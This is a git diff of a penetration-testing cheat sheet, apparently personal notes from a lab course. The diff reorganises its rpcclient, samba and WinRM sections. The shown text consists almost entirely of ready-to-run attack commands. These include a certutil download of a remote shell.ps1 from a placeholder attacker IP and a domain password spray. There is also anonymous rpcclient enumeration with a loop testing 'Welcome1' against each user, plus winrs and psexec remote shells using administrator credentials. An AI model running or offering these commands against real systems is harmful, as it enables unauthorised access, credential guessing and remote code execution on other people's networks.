@@ -11,7 +11,9 @@
 - [socat](#socat)
 - [TFTP](#tftp)
 - [setspn](#setspn)
-- [rpcclinet](#rpcclient)
+- [samba](#samba)
+  - [smbclient](#smbclient)
+  - [rpcclinet](#rpcclient)
 - [crackmapexec](#crackmapexec)
 - [kerbrute](#kerbrute)
 - [impacket](#impacket)
@@ -215,6 +217,12 @@ PS> certutil.exe -urlcache -split -f http://XXX.XXX.XXX.XXX:443/shell.ps1
 ```zsh
 $ net use \\DC01\ipc$ "" /u:""
 $ net user %username%
+```
+
+## WinRM
+tag: remote access
+```powershell
+PS> winrs.exe -u:TestAdminUser -p:TestAdminPassword -r:TargetIP_or_Hostname cmd
 ```
 
 # Metasploit
@@ -492,22 +500,7 @@ systemctl show -p Type syslog.service
 PS > Import-Module .\DomainPasswordSpray.ps1
 PS > Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
 
-# rpcclient
-https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration  
-https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/  
-```zsh
-$ rpcclient -U "" -N XXX.XXX.XXX.XXX
-rpcclient $> querydominfo
-rpcclient $> enumdomusers
-$ rpcclient -U "" -N 172.16.5.5 -c "queryuser 1170"
-$ rpcclient -U "" -N 172.16.5.5 -c "enumdomgroups" > a.txt
-$ grep Intern a.txt
-group:[Interns] rid:[0xff0]
-$
-$ echo $((16#ff0))
-4080
-$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.0.10 | grep Authority; done
-```
+
 
 # BloodHound  
 ```powershell
@@ -540,6 +533,24 @@ PS> dsquery * domainroot -filter "(&(objectCategory=person)(objectClass=user)(us
 ```zsh
 $ smbclient -U TestUser -N XXX.XXX.XXX.xXX
 ```
+
+## rpcclient
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration  
+https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/  
+```zsh
+$ rpcclient -U "" -N XXX.XXX.XXX.XXX
+rpcclient $> querydominfo
+rpcclient $> enumdomusers
+$ rpcclient -U "" -N 172.16.5.5 -c "queryuser 1170"
+$ rpcclient -U "" -N 172.16.5.5 -c "enumdomgroups" > a.txt
+$ grep Intern a.txt
+group:[Interns] rid:[0xff0]
+$
+$ echo $((16#ff0))
+4080
+$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.0.10 | grep Authority; done
+```
+
 
 # smbmap
 https://github.com/ShawnDEvans/smbmap  
@@ -676,10 +687,7 @@ PS> psexec64.exe \\MACHINE_IP -u TestAdminUser -p TestAdminPassword -i cmd.exe
 
 psexec.py inlanefreight.local/SAPService:'!SapperFi2'@172.16.5.5
 
-# WinRM
-```powershell
-PS> winrs.exe -u:TestAdminUser -p:TestAdminPassword -r:TargetIP_or_Hostname cmd
-```
+
 
 # Inveigh
 ## powershell
